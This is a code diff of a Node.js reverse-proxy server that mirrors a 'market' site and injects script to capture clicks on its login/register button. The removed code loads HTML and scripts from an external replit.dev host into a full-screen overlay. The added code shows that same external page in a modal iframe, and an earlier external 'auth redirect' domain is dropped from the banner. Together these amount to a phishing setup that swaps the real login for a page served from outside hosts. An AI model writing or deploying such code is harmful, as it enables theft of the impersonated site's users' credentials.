@@ -256,55 +256,75 @@ function modifyUrls(content, baseUrl, contentType = '') {
             // ВАЖНО: Перехват кликов по кнопке авторизации
             function interceptAuthButton() {
                 const handleAuthClick = async (e) => {
-    const button = e.target.closest('#login-register');
-    if (button) {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        
-        console.log('🔐 Auth button intercepted!');
-        
-        try {
-            // Загружаем HTML содержимое
-            const response = await fetch('https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html');
-            const htmlContent = await response.text();
-            
-            // Создаем контейнер для содержимого
-            const authContainer = document.createElement('div');
-            authContainer.id = 'auth-container';
-            authContainer.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                z-index: 9999;
-                background: white;
-            `;
-            
-            authContainer.innerHTML = htmlContent;
-            document.body.appendChild(authContainer);
-            
-            // Загружаем скрипты
-            const scripts = authContainer.getElementsByTagName('script');
-            for (let script of scripts) {
-                const newScript = document.createElement('script');
-                if (script.src) {
-                    newScript.src = script.src.replace('/bhcg4ddaadpt.js', 
-                        'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js');
-                } else {
-                    newScript.textContent = script.textContent;
-                }
-                document.head.appendChild(newScript);
-            }
-            
-        } catch (error) {
-            console.error('Error loading auth page:', error);
-        }
-        
-        return false;
-    }
-};
+                    const button = e.target.closest('#login-register');
+                    if (button) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        
+                        console.log('🔐 Auth button intercepted!');
+                        
+                        // Создаем модальное окно с iframe
+                        const modal = document.createElement('div');
+                        modal.style.cssText = \`
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 100%;
+                            background: rgba(0,0,0,0.8);
+                            z-index: 9999;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                        \`;
+                        
+                        const iframeContainer = document.createElement('div');
+                        iframeContainer.style.cssText = \`
+                            width: 90%;
+                            height: 90%;
+                            max-width: 800px;
+                            max-height: 600px;
+                            background: white;
+                            border-radius: 10px;
+                            position: relative;
+                            overflow: hidden;
+                        \`;
+                        
+                        const closeButton = document.createElement('button');
+                        closeButton.innerHTML = '×';
+                        closeButton.style.cssText = \`
+                            position: absolute;
+                            top: 10px;
+                            right: 10px;
+                            width: 30px;
+                            height: 30px;
+                            background: red;
+                            color: white;
+                            border: none;
+                            border-radius: 50%;
+                            font-size: 20px;
+                            cursor: pointer;
+                            z-index: 10000;
+                        \`;
+                        closeButton.onclick = () => document.body.removeChild(modal);
+                        
+                        const iframe = document.createElement('iframe');
+                        iframe.src = 'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html';
+                        iframe.style.cssText = \`
+                            width: 100%;
+                            height: 100%;
+                            border: none;
+                        \`;
+                        
+                        iframeContainer.appendChild(closeButton);
+                        iframeContainer.appendChild(iframe);
+                        modal.appendChild(iframeContainer);
+                        document.body.appendChild(modal);
+                        
+                        return false;
+                    }
+                };
                 
                 // Перехватываем клики на уровне документа
                 document.addEventListener('click', handleAuthClick, true);
@@ -563,12 +583,12 @@ app.use('*', async (req, res) => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server with External Auth Redirect
+    🚀 Advanced Market Proxy Server with Modal Auth
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
-    🔐 Auth Redirect: https://oldwwweeeewee.com
+    🔐 Auth: Modal iframe
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -578,7 +598,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ URL rewriting
     ✓ Content modification
     ✓ Mixed content prevention
-    ✓ External auth redirection
+    ✓ Modal auth window
     `);
 });
 
